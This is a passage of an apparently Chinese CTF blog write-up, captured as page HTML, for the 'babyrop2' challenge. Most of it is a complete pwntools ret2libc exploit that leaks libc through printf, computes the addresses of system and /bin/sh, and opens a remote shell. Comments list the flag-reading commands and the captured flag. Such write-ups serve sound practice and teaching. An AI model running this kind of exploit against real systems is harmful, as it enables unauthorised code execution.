class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#c = process(&#x27;/CTF/week34/source/6babyrop2&#x27;)</span></span><br><span class="line">ip = <span class="string">&#x27;node4.buuoj.cn:26523&#x27;</span>.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">c = remote(ip[<span class="number">0</span>],ip[<span class="number">1</span>])</span><br><span class="line">f = ELF(<span class="string">&#x27;/CTF/week34/source/6babyrop2&#x27;</span>)</span><br><span class="line">read_plt  = p64(f.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">printf_plt  = p64(f.plt[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">read_got  = p64(f.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">main_addr = p64(f.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">rdi       = p64(<span class="number">0x0000000000400733</span>)</span><br><span class="line">rsi_r15   = p64(<span class="number">0x0000000000400731</span>)</span><br><span class="line">_s       = p64(<span class="number">0x400770</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+rdi+ _s +rsi_r15+read_got+p64(<span class="number">0</span>)+printf_plt+main_addr <span class="comment">#read</span></span><br><span class="line">c.sendline(p) </span><br><span class="line"></span><br><span class="line"><span class="comment">#read_addr = u64(c.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8, b&#x27;\0&#x27;))</span></span><br><span class="line">read_addr = u64(c.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read_addr)  </span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&#x27;read&#x27;</span>)  </span><br><span class="line"></span><br><span class="line">system_addr = p64(libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>))</span><br><span class="line">binsh_addr = p64(libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+rdi+binsh_addr+system_addr</span><br><span class="line">c.recv()</span><br><span class="line">c.sendline(p)</span><br><span class="line">c.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># find -name &#x27;flag&#x27;</span></span><br><span class="line"><span class="comment"># cat /home/babyrop2/flag</span></span><br><span class="line"><span class="comment"># 0x0000000000400733 : pop rdi ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000400731 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="comment"># 使用rdi,rsi,rdx,rcx,r8,r9传递参数</span></span><br><span class="line"><span class="comment"># flag&#123;9beaa968-da44-49c7-9005-61c74b8c0783&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>晚点试试泄露printf的地址行不行.</p>
+</blockquote>
+
+        </article>
+        <section class="post-near">
+            <ul>
+                
+                    <li>上一篇: <a href="/2024/03/05/%E5%AF%92%E5%81%87%E7%AC%AC1%E5%91%A8wp/">寒假第1周wp</a></li>
+                
+                
+                    <li>下一篇: <a href="/2024/03/05/%E7%9F%B3%E5%A4%B4%E5%89%AA%E5%88%80%E5%B8%83/">石头剪刀布wp</a></li>
+                
+            </ul>
+        </section>
+        
+    
+        <section class="post-author">
+        
+            <figure class="author-avatar">
+                <img src="https://avatars.githubusercontent.com/u/149282793?v=4" alt="Skynion" />
+            </figure>
+        
+            <div class="author-info">
+                <h4>Skynion</h4>
+                <p>学习Pwn ing</p>
+            </div>
+        </section>
+    
+    </div>
+</main>
+
+    <footer>
+    <div class="buttons">
+        <a class="to-top" href="#"></a>
+    </div>
+    <div class="wrap min">
+        <section class="widget">
+            <div class="row">
+                <div class="col-m-4">
+                    <h3 class="title-recent">最新文章：</h3>
+                    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2024/03/05/%E5%AF%92%E5%81%87%E7%AC%AC1%E5%91%A8wp/">寒假第1周wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/03/05/%E9%9B%86%E8%AE%AD3-4%E5%91%A8wp/">集训3-4周wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/03/05/%E7%9F%B3%E5%A4%B4%E5%89%AA%E5%88%80%E5%B8%83/">石头剪刀布wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/03/05/%E9%9B%86%E8%AE%AD1-2%E5%91%A8wp/">集训1-2周wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/03/05/%E9%9B%86%E8%AE%AD5-6%E5%91%A8wp/">集训5-6周wp</a></li></ul>
+                </div>
+                <div class="col-m-4">
+                    <h3 class="title-date">时光机：</h3>
+                    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li></ul>
+                </div>
+                <div class="col-m-4">
+                    <h3 class="title-tags">标签云：</h3>
+                    
+                </div>
+            </div>
+        </section>
+        <section class="sub-footer">
+            <p>© 2024 <a href="/">Hexo</a>. All Rights Reserved. Theme By <a href="https://github.com/Dreamer-Paul/Hingle" target="_blank" rel="nofollow">Hingle</a>.</p>
+        </section>
+    </div>
+</footer>
+
+
+<script src="/static/kico.js"></script>
+<script src="/static/hingle.js"></script>
+
+
+<script>var hingle = new Paul_Hingle({"copyright":true,"night":true});</script>
+
+  </body>
+</html>
